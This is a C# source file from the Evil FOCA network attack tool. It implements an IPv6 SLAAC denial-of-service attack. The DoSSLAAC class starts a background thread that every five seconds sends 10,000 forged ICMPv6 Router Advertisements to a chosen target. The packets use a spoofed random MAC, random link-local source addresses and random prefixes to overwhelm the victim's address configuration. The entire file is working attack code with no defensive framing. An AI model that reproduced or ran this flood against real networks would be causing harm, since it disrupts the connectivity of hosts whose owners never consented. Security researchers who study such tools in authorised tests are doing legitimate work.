/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap.WinPcap;
using System.Collections.Generic;

namespace evilfoca.Attacks
{
    public class DoSSLAAC
    {
        private const int SendDoSAttackEachXSecs = 5;
        private const int NumberOfRouterAdvertisement = 10000;
        private WinPcapDevice device;
        private Thread threadAttack;
        private IList<Data.Attack> attacks;
        private Random random = new Random();
        public static PhysicalAddress MACsrc = DoSSLAAC.GetRandomMAC();

        public DoSSLAAC(WinPcapDevice device, IList<Data.Attack> attacks)
        {
            this.device = device;
            this.attacks = attacks;
        }

        public void Start()
        {
            threadAttack = new Thread(new ThreadStart(Attack));
            threadAttack.IsBackground = true;
            threadAttack.Start();
        }

        private void Attack()
        {
            while (true)
            {
                try
                {
                    foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.DoSSLAAC && A.attackStatus == Data.AttackStatus.Attacking))
                    {
                        if (attack is evilfoca.Data.DoSSLAACAttack)
                        {
                            for (int i = 0; i < NumberOfRouterAdvertisement; i++)
                            {
                                //MAC del equipo atacado
                                PhysicalAddress MACdst = (attack as evilfoca.Data.DoSSLAACAttack).t1.mac;

                                //IP de origen aleatoria pero siempre de vinculo local
                                IPAddress IPsrc = GetRandomLocalIPv6();
                                //IP atacada
                                IPAddress IPdst = (attack as evilfoca.Data.DoSSLAACAttack).t1.ip;

                                ICMPv6Packet routerAdvertisement = new ICMPv6Packet(new ByteArraySegment(new ICMPv6.NeighborRouterAdvertisement(MACsrc, GetRandomPrefix(), true).GetBytes()));
                                IPv6Packet ipv6 = new IPv6Packet(IPsrc, IPdst);
                                ipv6.PayloadPacket = routerAdvertisement;
                                ipv6.HopLimit = 255;
                                EthernetPacket ethernet = new EthernetPacket(MACsrc, MACdst, EthernetPacketType.IpV6);
                                ethernet.PayloadPacket = ipv6;
                                Program.CurrentProject.data.SendPacket(ethernet);
                            }
                        }
                    }


                    Thread.Sleep(SendDoSAttackEachXSecs * 1000);
                }
                catch (ThreadAbortException)
                {
                    return;
                }
                catch
                {
                }
            }
        }

        public static PhysicalAddress GetRandomMAC()
        {
            byte[] RandomMAC = new byte[6];
            Random random = new Random();
            random.NextBytes(RandomMAC);
            return new PhysicalAddress(RandomMAC);
        }

        public IPAddress GetRandomLocalIPv6()
        {
            byte[] Network = new byte[8] { 0xfe, 0x80, 0, 0, 0, 0, 0, 0 };
            byte[] RandomIP = new byte[16];
            random.NextBytes(RandomIP);
            Array.Copy(Network, RandomIP, 8);
            return new IPAddress(RandomIP);
        }

        public byte[] GetRandomPrefix()
        {
            byte[] prefix = new byte[8];
            random.NextBytes(prefix);
            return prefix;
        }

        public void Stop()
        {
            if (threadAttack != null && threadAttack.IsAlive)
            {
                threadAttack.Abort();
                threadAttack = null;
            }
        }

    }
}
